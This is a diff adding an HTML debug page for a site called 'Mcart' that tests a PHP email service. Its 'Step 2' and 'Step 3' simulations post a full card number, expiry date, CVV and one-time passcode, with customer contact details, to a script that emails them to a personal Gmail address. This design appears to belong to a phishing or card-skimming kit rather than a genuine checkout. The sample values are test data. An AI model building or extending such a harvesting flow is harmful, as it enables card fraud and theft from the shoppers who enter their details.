@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Email Debug - Mcart</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    .test-section { margin: 20px 0; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
+    button { padding: 10px 20px; margin: 10px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
+    button:hover { background: #0056b3; }
+    .result { margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+    .warning { background: #fff3cd; color: #856404; }
+    input, textarea { padding: 8px; margin: 5px; width: 300px; border: 1px solid #ccc; border-radius: 4px; }
+    textarea { height: 100px; }
+  </style>
+</head>
+<body>
+  <h1>Email Debug & Testing - Mcart</h1>
+  <p>Test different email methods and debug issues</p>
+  
+  <div class="test-section">
+    <h2>🧪 Quick Test - Robust Email Service</h2>
+    <p>Tests the new robust email service with fallbacks</p>
+    <button onclick="testRobustEmail()">Test Robust Email</button>
+    <div id="robust-result" class="result"></div>
+  </div>
+  
+  <div class="test-section">
+    <h2>📧 Step 2 Simulation - Payment Details</h2>
+    <p>Simulate step 2 payment form submission</p>
+    <button onclick="testStep2()">Test Step 2 Format</button>
+    <div id="step2-result" class="result"></div>
+  </div>
+  
+  <div class="test-section">
+    <h2>🔐 Step 3 Simulation - OTP Verification</h2>
+    <p>Simulate step 3 OTP verification</p>
+    <button onclick="testStep3()">Test Step 3 Format</button>
+    <div id="step3-result" class="result"></div>
+  </div>
+  
+  <div class="test-section">
+    <h2>✉️ Custom Email Test</h2>
+    <p>Send custom test email</p>
+    <input type="email" id="custom-to" placeholder="To: rashiverma904@gmail.com" value="rashiverma904@gmail.com">
+    <br>
+    <input type="text" id="custom-subject" placeholder="Subject" value="Test Email from Mcart">
+    <br>
+    <textarea id="custom-message" placeholder="Message">This is a test email from the Mcart debug system.</textarea>
+    <br>
+    <button onclick="testCustomEmail()">Send Custom Email</button>
+    <div id="custom-result" class="result"></div>
+  </div>
+  
+  <div class="test-section">
+    <h2>🔍 Check PHP Environment</h2>
+    <p>Check if PHP mail is configured</p>
+    <button onclick="checkPHPEnvironment()">Check PHP Environment</button>
+    <div id="php-result" class="result"></div>
+  </div>
+
+  <script>
+    // Test robust email service
+    function testRobustEmail() {
+      const result = document.getElementById('robust-result');
+      result.innerHTML = 'Testing robust email service...';
+      
+      const formData = new FormData();
+      formData.append('to_email', 'rashiverma904@gmail.com');
+      formData.append('subject', 'Robust Email Test - ' + new Date().toISOString());
+      formData.append('from_name', 'Mcart Debug System');
+      formData.append('from_email', 'debug@mcart.com');
+      formData.append('message', 'This is a test of the robust email service with fallbacks.');
+      formData.append('payment_method', 'test_credit_card');
+      formData.append('card_name', 'Test User');
+      formData.append('card_number', '4242424242424242');
+      
+      fetch('send_email_robust.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        result.innerHTML = '✅ ROBUST EMAIL TEST RESULT:\n\n' + JSON.stringify(data, null, 2);
+        result.className = data.success ? 'result success' : 'result warning';
+      })
+      .catch(error => {
+        result.innerHTML = '❌ ERROR:\n\n' + error.message;
+        result.className = 'result error';
+      });
+    }
+    
+    // Test Step 2 format
+    function testStep2() {
+      const result = document.getElementById('step2-result');
+      result.innerHTML = 'Testing Step 2 payment format...';
+      
+      const formData = new FormData();
+      formData.append('to_email', 'rashiverma904@gmail.com');
+      formData.append('subject', 'Mcart Order - Step 2 Payment');
+      formData.append('from_name', 'John Doe');
+      formData.append('from_email', 'john@example.com');
+      formData.append('payment_method', 'credit_card');
+      formData.append('card_name', 'John Doe');
+      formData.append('card_number', '4242424242424242');
+      formData.append('expiry', '12/25');
+      formData.append('cvv', '123');
+      formData.append('contact_info', 'John Doe | john@example.com | +1234567890');
+      formData.append('cart_data', 'Product x2 | INR 500');
+      formData.append('order_total', '500');
+      formData.append('message', 'New payment received from Mcart checkout step 2');
+      
+      fetch('send_email_robust.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        result.innerHTML = '✅ STEP 2 TEST RESULT:\n\n' + JSON.stringify(data, null, 2);
+        result.className = data.success ? 'result success' : 'result warning';
+      })
+      .catch(error => {
+        result.innerHTML = '❌ STEP 2 ERROR:\n\n' + error.message;
+        result.className = 'result error';
+      });
+    }
+    
+    // Test Step 3 format
+    function testStep3() {
+      const result = document.getElementById('step3-result');
+      result.innerHTML = 'Testing Step 3 OTP format...';
+      
+      const formData = new FormData();
+      formData.append('to_email', 'rashiverma904@gmail.com');
+      formData.append('subject', 'Mcart Order - COMPLETED');
+      formData.append('from_name', 'Mcart System');
+      formData.append('from_email', 'noreply@mcart.com');
+      formData.append('otp', '123456');
+      formData.append('order_id', 'ORD-' + Date.now());
+      formData.append('contact_info', 'John Doe | john@example.com | +1234567890');
+      formData.append('payment_info', 'Credit Card ending in 4242');
+      formData.append('cart_data', 'Product x2 | INR 500');
+      formData.append('order_total', '500');
+      formData.append('message', 'ORDER COMPLETED - OTP verified: 123456');
+      
+      fetch('send_email_robust.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        result.innerHTML = '✅ STEP 3 TEST RESULT:\n\n' + JSON.stringify(data, null, 2);
+        result.className = data.success ? 'result success' : 'result warning';
+      })
+      .catch(error => {
+        result.innerHTML = '❌ STEP 3 ERROR:\n\n' + error.message;
+        result.className = 'result error';
+      });
+    }
+    
+    // Test custom email
+    function testCustomEmail() {
+      const result = document.getElementById('custom-result');
+      result.innerHTML = 'Sending custom email...';
+      
+      const formData = new FormData();
+      formData.append('to_email', document.getElementById('custom-to').value);
+      formData.append('subject', document.getElementById('custom-subject').value);
+      formData.append('from_name', 'Mcart Custom Test');
+      formData.append('from_email', 'custom@mcart.com');
+      formData.append('message', document.getElementById('custom-message').value);
+      
+      fetch('send_email_robust.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        result.innerHTML = '✅ CUSTOM EMAIL RESULT:\n\n' + JSON.stringify(data, null, 2);
+        result.className = data.success ? 'result success' : 'result warning';
+      })
+      .catch(error => {
+        result.innerHTML = '❌ CUSTOM EMAIL ERROR:\n\n' + error.message;
+        result.className = 'result error';
+      });
+    }
+    
+    // Check PHP environment
+    function checkPHPEnvironment() {
+      const result = document.getElementById('php-result');
+      result.innerHTML = 'Checking PHP environment...';
+      
+      fetch('send_email_robust.php', {
+        method: 'GET'
+      })
+      .then(response => response.text())
+      .then(data => {
+        result.innerHTML = '📊 PHP ENVIRONMENT CHECK:\n\n' + data;
+        result.className = 'result success';
+      })
+      .catch(error => {
+        result.innerHTML = '❌ PHP ENVIRONMENT ERROR:\n\n' + error.message;
+        result.className = 'result error';
+      });
+    }
+  </script>
+</body>
+</html>
